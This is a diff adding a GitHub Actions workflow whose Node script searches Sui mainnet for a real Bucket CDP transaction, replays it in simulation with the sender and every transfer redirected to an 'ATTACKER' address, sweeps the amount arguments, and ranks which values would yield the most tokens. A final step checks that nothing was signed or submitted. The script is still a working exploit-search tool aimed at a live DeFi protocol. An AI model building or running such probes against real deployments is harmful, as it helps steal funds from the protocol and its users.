@@ -1,0 +1,255 @@
+name: Bucket CDP Account Amount Sweep R26
+
+on:
+  pull_request:
+    branches: [main]
+  workflow_dispatch:
+
+permissions:
+  contents: read
+
+jobs:
+  sweep:
+    runs-on: ubuntu-latest
+    timeout-minutes: 45
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Install official Mysten SDK
+        shell: bash
+        run: |
+          set -euo pipefail
+          rm -rf bucket-cdp-account-amount-r26
+          mkdir -p bucket-cdp-account-amount-r26/raw
+          cd bucket-cdp-account-amount-r26
+          npm init -y >/dev/null
+          npm pkg set type=module >/dev/null
+          npm install --no-audit --no-fund @mysten/sui@2.23.2
+          npm list @mysten/sui | tee SDK_VERSION.txt
+
+      - name: Mutate every pure request argument and measure attacker output
+        shell: bash
+        run: |
+          set -euo pipefail
+          cat > bucket-cdp-account-amount-r26/probe.mjs <<'JS'
+          import fs from 'node:fs';
+          import { Transaction } from '@mysten/sui/transactions';
+          import { SuiGrpcClient } from '@mysten/sui/grpc';
+
+          const RPCS = ['https://fullnode.mainnet.sui.io:443', 'https://sui-mainnet-endpoint.blockvision.org'];
+          const client = new SuiGrpcClient({ network: 'mainnet', baseUrl: RPCS[0] });
+          const ACCOUNT = '0x0bd4c9887129746355e0b44552fc2c92787a4fa418249ce1f92e84ab47e28b54';
+          const ATTACKER = '0x1111111111111111111111111111111111111111111111111111111111111111';
+          const SUI = '0x2::sui::SUI';
+          const GAS_CANDIDATES = [
+            '0xaa3f912fe367c683001161ce16e040b606437f03c30c346fd17548425783a9a6',
+            '0x954ee376568ab84a439cf3c7548f7bba7c2e923d0e333ea055b397ca2f34ada9',
+          ];
+          const VALUES = [
+            0n, 1n, 10n, 1_000n, 1_000_000n, 10_000_000n,
+            100_000_000n, 1_000_000_000n, 10_000_000_000n,
+            100_000_000_000n, 1_000_000_000_000n,
+          ];
+
+          async function rpc(method, params) {
+            const failures = [];
+            for (const endpoint of RPCS) {
+              try {
+                const response = await fetch(endpoint, {
+                  method: 'POST', headers: { 'content-type': 'application/json' },
+                  body: JSON.stringify({ jsonrpc: '2.0', id: 1, method, params }),
+                });
+                const body = await response.json();
+                if (body.error) throw new Error(JSON.stringify(body.error));
+                return { endpoint, result: body.result };
+              } catch (error) { failures.push({ endpoint, error: error?.message ?? String(error) }); }
+            }
+            return { failures };
+          }
+          async function sponsor() {
+            for (const owner of GAS_CANDIDATES) {
+              const wrapper = await rpc('suix_getCoins', [owner, SUI, null, 50]);
+              const coin = (wrapper?.result?.data ?? []).filter((row) => BigInt(row.balance ?? 0) > 300_000_000n)
+                .sort((a, b) => BigInt(a.balance) < BigInt(b.balance) ? 1 : -1)[0];
+              if (coin) return { owner, coin: { objectId: coin.coinObjectId, version: String(coin.version), digest: coin.digest, balance: coin.balance } };
+            }
+            return null;
+          }
+          function callOf(command) { return command?.MoveCall ?? (command?.$kind === 'MoveCall' ? command.MoveCall : null); }
+          function transferOf(command) { return command?.TransferObjects ?? (command?.$kind === 'TransferObjects' ? command.TransferObjects : null); }
+          function sourceCommands(tx) { return tx?.transaction?.data?.transaction?.transactions ?? []; }
+          function sourceNames(tx) { return sourceCommands(tx).map(callOf).filter(Boolean).map((c) => `${c.module}::${c.function}`); }
+          function addressOf(change) { return String(change?.address ?? change?.owner?.AddressOwner ?? change?.owner?.address ?? ''); }
+          function positiveOutput(tx) {
+            const sender = tx?.transaction?.data?.sender;
+            return (tx?.balanceChanges ?? []).some((row) => {
+              try { return addressOf(row) === sender && !String(row.coinType).endsWith('::sui::SUI') && BigInt(row.amount) > 0n; } catch { return false; }
+            });
+          }
+          function noOwnedInputs(tx) {
+            return !(tx?.transaction?.data?.transaction?.inputs ?? []).some((input) => {
+              const kind = String(input?.objectType ?? input?.type ?? '').toLowerCase();
+              return kind.includes('immorowned') || kind.includes('ownedobject') || Boolean(input?.ImmOrOwnedObject);
+            });
+          }
+          const query = await rpc('suix_queryTransactionBlocks', [{
+            filter: { InputObject: ACCOUNT },
+            options: { showInput: true, showRawInput: true, showEffects: true, showEvents: true, showObjectChanges: true, showBalanceChanges: true },
+          }, null, 100, true]);
+          const selected = (query?.result?.data ?? []).find((tx) => {
+            const names = sourceNames(tx);
+            const status = tx?.effects?.status?.status ?? tx?.effects?.status?.success;
+            return (status === 'success' || status === true) && tx.rawTransaction && positiveOutput(tx) && noOwnedInputs(tx)
+              && ['vault::borrow_protocol_cap','account::request_with_account','vault::debtor_request','vault::update_position'].every((x) => names.includes(x));
+          });
+          if (!selected) throw new Error('No output-producing Account/CDP PTB without owned inputs');
+          fs.writeFileSync('raw/selected.json', JSON.stringify(selected, null, 2));
+          const gas = await sponsor();
+          fs.writeFileSync('raw/gas.json', JSON.stringify(gas, null, 2));
+
+          function txData(tx) { const data = tx.getData(); return { data, commands: data.commands ?? data.transactions ?? [] }; }
+          function configure(tx) {
+            tx.setSender(ATTACKER);
+            if (gas) {
+              tx.setGasOwner(gas.owner);
+              tx.setGasPayment([{ objectId: gas.coin.objectId, version: gas.coin.version, digest: gas.coin.digest }]);
+              tx.setGasBudget(300_000_000);
+            }
+          }
+          function redirect(tx) {
+            const recipient = tx.pure.address(ATTACKER);
+            let count = 0;
+            for (const command of txData(tx).commands) {
+              const row = transferOf(command);
+              if (!row) continue;
+              if ('address' in row) row.address = recipient;
+              else if ('recipient' in row) row.recipient = recipient;
+              else if (Array.isArray(row)) row[row.length - 1] = recipient;
+              count += 1;
+            }
+            return count;
+          }
+          function candidateArgs(tx) {
+            const rows = [];
+            const commands = txData(tx).commands;
+            commands.forEach((command, commandIndex) => {
+              const call = callOf(command);
+              if (!call || !['debtor_request','update_position'].includes(call.function)) return;
+              (call.arguments ?? []).forEach((argument, argumentIndex) => {
+                if (argument && typeof argument === 'object' && argument.Input !== undefined) {
+                  rows.push({ commandIndex, argumentIndex, module: call.module, function: call.function, original: argument });
+                }
+              });
+            });
+            return rows;
+          }
+          function replaceArg(tx, target, value) {
+            const command = txData(tx).commands[target.commandIndex];
+            const call = callOf(command);
+            const args = call.arguments ?? [];
+            args[target.argumentIndex] = tx.pure.u64(value);
+            call.arguments = args;
+          }
+          function parsed(result) {
+            if (result?.$kind === 'Transaction') return { success: true, payload: result.Transaction, error: null };
+            if (result?.$kind === 'FailedTransaction') { const p = result.FailedTransaction; return { success: false, payload: p, error: p?.status?.error ?? p?.effects?.status?.error ?? null }; }
+            if (result?.Transaction) return { success: true, payload: result.Transaction, error: null };
+            if (result?.FailedTransaction) { const p = result.FailedTransaction; return { success: false, payload: p, error: p?.status?.error ?? p?.effects?.status?.error ?? null }; }
+            return { success: false, payload: result, error: result?.thrown ?? { message: 'unknown result shape' } };
+          }
+          function deltas(payload) {
+            return (payload?.balanceChanges ?? []).filter((row) => addressOf(row) === ATTACKER).map((row) => ({ coinType: row.coinType, amount: String(row.amount), owner: row.owner ?? row.address }));
+          }
+          function maxPositiveNonGas(rows) {
+            let best = null;
+            for (const row of rows) {
+              try {
+                const amount = BigInt(row.amount);
+                if (!String(row.coinType).endsWith('::sui::SUI') && amount > 0n && (!best || amount > BigInt(best.amount))) best = row;
+              } catch {}
+            }
+            return best;
+          }
+          async function simulate(label, mutate) {
+            const tx = Transaction.from(selected.rawTransaction);
+            configure(tx);
+            const redirected = redirect(tx);
+            const mutation = mutate ? mutate(tx) : null;
+            let result;
+            try {
+              result = await client.core.simulateTransaction({ transaction: tx, include: { commandResults: true, effects: true, events: true, balanceChanges: true, objectTypes: true, transaction: true } });
+            } catch (error) { result = { thrown: { name: error?.name, message: error?.message, stack: error?.stack, cause: error?.cause } }; }
+            fs.writeFileSync(`raw/${label}.json`, JSON.stringify(result, null, 2));
+            const state = parsed(result); const error = state.error; const balance = deltas(state.payload);
+            return {
+              label, success: state.success, redirected, mutation,
+              attackerBalanceDeltas: balance, maxPositiveNonGas: maxPositiveNonGas(balance),
+              errorMessage: error?.message ?? JSON.stringify(error), abortCode: error?.MoveAbort?.abortCode ?? null,
+              abortLocation: error?.MoveAbort?.location ?? null,
+            };
+          }
+
+          const template = Transaction.from(selected.rawTransaction);
+          const targets = candidateArgs(template);
+          fs.writeFileSync('raw/candidate_arguments.json', JSON.stringify(targets, null, 2));
+          const attempts = [await simulate('baseline', null)];
+          for (const target of targets) {
+            for (const value of VALUES) {
+              attempts.push(await simulate(`c${target.commandIndex}_a${target.argumentIndex}_v${value}`, (tx) => {
+                replaceArg(tx, target, value);
+                return { ...target, value: value.toString() };
+              }));
+            }
+          }
+          const successes = attempts.filter((row) => row.success && row.maxPositiveNonGas);
+          successes.sort((a, b) => {
+            const av = BigInt(a.maxPositiveNonGas.amount); const bv = BigInt(b.maxPositiveNonGas.amount);
+            return av < bv ? 1 : av > bv ? -1 : 0;
+          });
+          const winner = successes[0] ?? null;
+          const summary = {
+            schema: 'bucket-cdp-account-amount-sweep-r26/v1', network: 'sui-mainnet', readOnly: true,
+            selectedDigest: selected.digest, sourceSender: selected?.transaction?.data?.sender,
+            targets, testedValues: VALUES.map(String), attempts, winner,
+            gates: {
+              baselineValueOutputSuccess: attempts[0]?.success === true && Boolean(attempts[0]?.maxPositiveNonGas),
+              scalableValueOutputFound: successes.length > 1,
+              materialRawOutputFound: Boolean(winner && BigInt(winner.maxPositiveNonGas.amount) >= 100_000_000_000n),
+            },
+            productionTransactionsSubmitted: 0,
+            generatedUnix: Math.floor(Date.now() / 1000),
+          };
+          fs.writeFileSync('SUMMARY.json', JSON.stringify(summary, null, 2));
+          console.log('BUCKET_R26_SUMMARY=' + JSON.stringify({ selectedDigest: summary.selectedDigest, targets, winner, gates: summary.gates, successfulCount: successes.length }));
+          JS
+          cd bucket-cdp-account-amount-r26
+          node probe.mjs | tee run.log
+          find . -type f ! -path './node_modules/*' -print0 | sort -z | xargs -0 sha256sum > SHA256SUMS.txt
+
+      - name: Validate read-only boundary
+        shell: bash
+        run: |
+          set -euo pipefail
+          grep -RniE 'executeTransaction|signAndExecute|private.?key|mnemonic' bucket-cdp-account-amount-r26 && exit 1 || true
+          python3 - <<'PY'
+          import json
+          summary = json.load(open('bucket-cdp-account-amount-r26/SUMMARY.json'))
+          assert summary['readOnly'] is True
+          assert summary['productionTransactionsSubmitted'] == 0
+          print('BUCKET_CDP_ACCOUNT_AMOUNT_R26_READ_ONLY_PASS')
+          print('MATERIAL_RAW_OUTPUT_FOUND=', summary['gates']['materialRawOutputFound'])
+          PY
+
+      - name: Upload evidence
+        uses: actions/upload-artifact@v4
+        with:
+          name: bucket-cdp-account-amount-r26
+          path: |
+            bucket-cdp-account-amount-r26/SUMMARY.json
+            bucket-cdp-account-amount-r26/SDK_VERSION.txt
+            bucket-cdp-account-amount-r26/probe.mjs
+            bucket-cdp-account-amount-r26/run.log
+            bucket-cdp-account-amount-r26/SHA256SUMS.txt
+            bucket-cdp-account-amount-r26/raw
+          if-no-files-found: error
+          retention-days: 7
